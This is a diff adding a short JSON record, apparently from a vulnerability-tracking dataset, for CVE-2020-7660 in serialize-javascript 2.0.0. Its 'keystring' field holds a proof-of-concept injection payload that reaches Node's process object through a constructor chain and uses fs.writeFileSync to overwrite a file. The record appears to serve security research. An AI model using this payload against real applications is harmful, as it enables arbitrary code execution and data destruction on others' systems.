@@ -1,0 +1,8 @@
+{
+  "id": "CVE-2020-7660",
+  "upstream": "serialize-javascript@2.0.0",
+  "keymethod": "#main",
+  "keystring": "(\" + serialize({ str: \"string\" + this.constructor .constructor(`return process`)() .mainModule.require(`fs`) .writeFileSync(`serialize-javascript`, ``),  }) +\")",
+  "location": "",
+  "downstreams": []
+}
